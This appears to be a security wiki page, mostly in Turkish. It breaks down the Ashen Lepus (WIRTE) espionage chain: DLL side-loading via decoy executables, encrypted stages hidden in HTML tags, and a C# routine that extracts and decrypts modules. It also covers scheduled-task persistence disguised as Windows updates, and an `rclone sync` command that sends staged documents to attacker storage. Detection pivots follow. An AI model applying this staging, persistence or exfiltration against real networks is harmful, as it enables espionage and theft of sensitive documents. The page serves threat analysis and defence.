# Advanced DLL Side-Loading With HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Tradecraft Genel Bakış

Ashen Lepus (aka WIRTE) Orta Doğu diplomatik ağlarında kalıcılık sağlamak için DLL sideloading, staged HTML payloads ve modular .NET backdoors zincirleyen tekrarlanabilir bir deseni silahlandırdı. Teknik herhangi bir operatör tarafından yeniden kullanılabilir çünkü şu unsurlara dayanır:

- **Archive-based social engineering**: zararsız PDF'ler hedefleri bir dosya paylaşım sitesinden bir RAR arşivi indirmeleri için yönlendirir. Arşiv, gerçek görünümlü bir belge görüntüleyici EXE, güvenilir bir kütüphaneyi taklit eden (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) kötü amaçlı bir DLL ve bir yem `Document.pdf` içerir.
- **DLL search order abuse**: kurban EXE'ye çift tıklar, Windows DLL importunu geçerli dizinden çözer ve kötü amaçlı yükleyici (AshenLoader) güvenilir süreç içinde çalışırken yem PDF şüpheyi azaltmak için açılır.
- **Living-off-the-land staging**: sonraki her aşama (AshenStager → AshenOrchestrator → modules) ihtiyaç duyulana kadar diske yazılmaz; bunun yerine aksi halde zararsız görünen HTML yanıtlarının içinde gizlenmiş şifrelenmiş bloblar olarak iletilir.

## Çok Aşamalı Side-Loading Zinciri

1. **Decoy EXE → AshenLoader**: EXE, AshenLoader'ı side-load eder; AshenLoader host keşfi yapar, AES-CTR ile şifreler ve `token=`, `id=`, `q=` veya `auth=` gibi dönen parametreler içinde API görünümlü path'lere (ör. `/api/v2/account`) POST eder.
2. **HTML extraction**: C2, istemci IP'si hedef bölgeye geolokasyon olarak denk geldiğinde ve `User-Agent` implant ile eşleştiğinde bir sonraki aşamayı açığa çıkarır, bu da sandboxes'ları yanıltır. Kontroller geçince HTTP gövdesi Base64/AES-CTR ile şifrelenmiş AshenStager yükünü içeren bir `<headerp>...</headerp>` blob'u barındırır.
3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir meşru ikili ile dağıtılır. İkiliye enjekte edilen kötü amaçlı kopya daha fazla HTML çeker; bu sefer `<article>...</article>`'ı oyup AshenOrchestrator'ı geri çıkarır.
4. **AshenOrchestrator**: Base64 JSON konfigürasyonunu çözen modüler bir .NET kontrolörüdür. Konfigürasyonun `tg` ve `au` alanları birleştirilip/karma alınarak AES anahtarını oluşturur; bu anahtar `xrk`'ı deşifre eder. Ortaya çıkan byte'lar daha sonra alınan her modül blob'u için bir XOR anahtarı olarak kullanılır.
5. **Module delivery**: her modül parser'ı rastgele bir etikete yönlendiren HTML yorumları aracılığıyla tanımlanır; bu, yalnızca `<headerp>` veya `<article>` arayan statik kuralları bozar. Modüller persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), and file exploration (`FE`) içerir.

### HTML Konteyner Ayrıştırma Deseni
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Even if defenders block or strip a specific element, the operator only needs to change the tag hinted in the HTML comment to resume delivery.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.

## Persistence & Execution Loop

AshenStager drops scheduled tasks that masquerade as Windows maintenance jobs and execute via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

These tasks relaunch the sideloading chain on boot or at intervals, ensuring AshenOrchestrator can request fresh modules without touching disk again.

## Using Benign Sync Clients for Exfiltration

Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) through a dedicated module, then download the legitimate [Rclone](https://rclone.org/) binary to synchronize that directory with attacker storage:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Because Rclone is widely used for legitimate backup workflows, defenders must focus on anomalous executions (new binaries, odd remotes, or sudden syncing of `C:\Users\Public`).

## Detection Pivots

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)

{{#include ../../../banners/hacktricks-training.md}}
